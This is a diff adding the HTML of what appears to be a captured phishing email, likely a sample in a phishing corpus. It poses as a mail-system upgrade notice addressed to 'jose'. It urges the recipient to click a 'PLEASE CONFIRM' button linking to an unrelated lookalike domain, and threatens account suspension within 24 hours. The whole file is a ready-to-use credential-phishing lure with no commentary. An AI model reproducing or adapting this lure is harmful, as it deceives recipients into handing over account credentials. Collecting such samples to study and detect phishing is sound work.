@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title></title>
+    <meta name="GENERATOR" content="MSHTML 11.00.10570.1001">
+</head>
+
+<body>
+    <div style="FONT-SIZE: 12px; MARGIN-BOTTOM: 7px; FONT-FAMILY: Helvetica, Dotum, sans-serif; BACKGROUND-COLOR: rgb(245,246,247);">
+        <p style="COLOR: rgb(51,51,51); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 16px; PADDING-RIGHT: 0px;">Dear jose ,<br>&nbsp;</p>
+        <div>We are upgrading our system to provide the best experience and keep your mail&nbsp;protected<br>&nbsp;</div>
+        <div>Please confirm your jose@monkey.org address is accurate to complete system upgrade</div>
+        <div>&nbsp;<table style="FONT-SIZE: 12px; FONT-FAMILY: &quot;times new roman&quot;, &quot;new york&quot;, times, serif; BORDER-COLLAPSE: collapse; COLOR: rgb(68,68,68); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 21px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(245,246,247); TEXT-INDENT: 0px; font-feature-settings: &quot;liga&quot; 0;" cellspacing="0" border="1">
+                <tbody style="WIDTH: 218px; LINE-HEIGHT: 21px;">
+                    <tr style="LINE-HEIGHT: 21px;">
+                        <td style="FONT-FAMILY: arial, sans-serif; MIN-WIDTH: 50px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 20px; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(38,114,236);" bgcolor="#2672ec"><strong>&nbsp;<a style="COLOR: rgb(255,255,255); PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: transparent;" href="https://mails.refrence.site/propagation.html?line=jose@monkey.org" rel="noopener noreferrer" target="_blank">PLEASE CONFIRM</a></strong></td>
+                    </tr>
+                </tbody>
+            </table>
+            <p><br>To avoid email suspension, please authenticate your account within 24 hours.</p>
+            <p>&nbsp;</p>
+            <p>&nbsp;</p>
+        </div>
+    </div>
+</body>
+
+</html>
